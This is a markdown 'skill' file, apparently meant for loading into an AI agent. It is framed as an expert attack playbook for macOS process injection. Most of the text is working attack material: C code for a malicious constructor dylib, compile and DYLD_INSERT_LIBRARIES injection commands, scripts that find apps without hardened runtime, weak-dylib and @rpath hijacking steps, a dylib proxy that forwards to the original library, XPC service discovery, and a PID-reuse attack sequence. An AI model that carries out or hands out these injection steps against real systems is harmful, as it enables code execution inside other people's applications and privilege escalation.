For other original section numbers, use the [entry index](../SKILL.md#references).


# SKILL: macOS Process Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert macOS process injection techniques. Covers DYLD_INSERT_LIBRARIES, dylib hijacking (weak/rpath/proxy), XPC PID reuse attacks, Mach port manipulation, MIG abuse, and Electron injection. Base models miss entitlement prerequisites and SIP constraints on injection vectors.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [macos-security-bypass](../../macos-security-bypass/SKILL.md) when you need to bypass TCC, Gatekeeper, or SIP protections blocking your injection
- [linux-privilege-escalation](../../linux-privilege-escalation/SKILL.md) for Unix-layer escalation (shared object hijacking concepts apply)

### Advanced Reference

Also load [DYLIB_XPC_TECHNIQUES.md](../DYLIB_XPC_TECHNIQUES.md) when you need:
- Step-by-step dylib hijacking methodology with tooling commands
- XPC exploitation walkthrough with code examples
- Mach port technique details and task_for_pid patterns

---

## 1. DYLD_INSERT_LIBRARIES INJECTION

The most straightforward injection: set an environment variable that forces the dynamic linker to preload your dylib.

### 1.1 Requirements and Restrictions

| Condition | Can Inject? | Reason |
|---|---|---|
| Normal (non-hardened) binary | Yes | No restrictions |
| Hardened Runtime enabled | No | DYLD strips env vars |
| Hardened Runtime + `com.apple.security.cs.allow-dyld-environment-variables` | Yes | Entitlement explicitly allows it |
| Apple system binary (SIP-protected) | No | DYLD env vars stripped by SIP |
| SUID/SGID binary | No | DYLD env vars stripped for privilege safety |
| App Sandbox enabled | No | Sandbox blocks env var injection |

### 1.2 Basic Injection

```bash
# Create malicious dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    printf("[+] Injected into PID %d\n", getpid());
    // payload here
}
EOF

# Compile for both architectures
gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64

# Inject into target
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target
```

### 1.3 Finding Injectable Targets

```bash
# Find apps WITHOUT hardened runtime
find /Applications -name "*.app" -exec sh -c '
  binary=$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  if [ -n "$binary" ]; then
    flags=$(codesign -d --verbose "$1/Contents/MacOS/$binary" 2>&1)
    echo "$flags" | grep -q "runtime" || echo "No Hardened Runtime: $1"
  fi
' _ {} \;

# Find apps with dyld env var entitlement
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/"$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  codesign -d --entitlements :- "$binary" 2>/dev/null | \
    grep -q "allow-dyld-environment-variables" && echo "DYLD injectable: $1"
' _ {} \;
```

---

## 2. DYLIB HIJACKING

Exploit the dynamic linker's library search order to load attacker-controlled dylibs instead of (or in addition to) legitimate ones.

### 2.1 Weak Dylib Hijacking (LC_LOAD_WEAK_DYLIB)

Weak dylibs are optional — if missing, the binary still runs. If you can place a dylib at the expected path, it loads.

```bash
# Find binaries with weak dylib references
otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB

# Check if the weak dylib actually exists
otool -L /path/to/binary | grep weak | while read lib rest; do
  [ ! -f "$lib" ] && echo "MISSING (hijackable): $lib"
done
```

### 2.2 @rpath Hijacking

`@rpath` is resolved from `LC_RPATH` entries in the binary. If an earlier rpath directory is writable, you can place your dylib there.

```bash
# List rpath entries
otool -l /path/to/binary | grep -A 2 LC_RPATH

# List rpath-relative dylib references
otool -L /path/to/binary | grep @rpath

# If rpath includes writable directory (e.g., app's Frameworks/)
# place malicious dylib with matching name there
```

### 2.3 Dylib Proxying

Replace a legitimate dylib with a malicious one that forwards all exports to the original.

```bash
# Step 1: Identify target dylib and its exports
nm -gU /path/to/original.dylib | awk '{print $3}'

# Step 2: Create proxy dylib that re-exports everything
# Move original to original_real.dylib
# Create proxy:
cat > proxy.c << 'EOF'
__attribute__((constructor))
void payload() {
    // malicious code here
}
EOF

gcc -dynamiclib -o hijacked.dylib proxy.c \
  -Wl,-reexport_library,/path/to/original_real.dylib \
  -arch x86_64 -arch arm64
```

### 2.4 Dependency Enumeration

```bash
otool -L /path/to/binary              # List all dylib dependencies
otool -l /path/to/binary              # Full load commands (rpaths, weak, etc.)
dyldinfo -print_dependencies /path/to/binary  # Detailed dependency info (pre-Ventura)
```

---

## 3. XPC EXPLOITATION

XPC (Cross-Process Communication) is macOS's primary IPC mechanism for privilege separation. Privileged XPC services are high-value targets.

### 3.1 XPC Service Discovery

```bash
# System XPC services
find /System/Library -name "*.xpc" -type d 2>/dev/null | head -20

# Third-party XPC services
find /Library /Applications -name "*.xpc" -type d 2>/dev/null

# LaunchDaemon XPC services (root-level)
grep -r "MachServices" /Library/LaunchDaemons/*.plist 2>/dev/null
grep -r "MachServices" /System/Library/LaunchDaemons/*.plist 2>/dev/null
```

### 3.2 PID Reuse Attack

XPC connections validated by PID are vulnerable to race conditions: attacker spawns process, PID is checked and passes, attacker's process exits, OS reuses PID for malicious process.

| Validation Method | Vulnerable? | Notes |
|---|---|---|
| PID-based check | Yes | PID recycled after process exit |
| Audit token | No | Unique per process lifecycle, not recycled |
| Code signature check | No | Validates signing identity |
| Entitlement check | No | Checks process entitlements |

```
Timeline of PID reuse attack:
1. Legitimate client (PID 1234) connects to XPC service
2. XPC service checks PID 1234 → valid
3. Legitimate client exits (PID 1234 freed)
4. Attacker rapidly forks to get PID 1234
5. Attacker's process (now PID 1234) sends malicious XPC message
6. XPC service trusts PID 1234 (cached validation)
```

### 3.3 XPC Client Validation Weaknesses

| Weakness | Description | Exploitation |
|---|---|---|
| No client validation | Service accepts any connection | Connect directly, send commands |
| PID-only validation | Race condition exploitable | PID reuse attack (§3.2) |
| Bundle ID check only | Bundle IDs can be spoofed | Create app with matching bundle ID |
| Partial code requirement | Missing anchor checks | Sign with any cert matching partial requirement |
| Entitlement check on wrong process | Checks parent instead of client | Spawn from entitled parent |

---

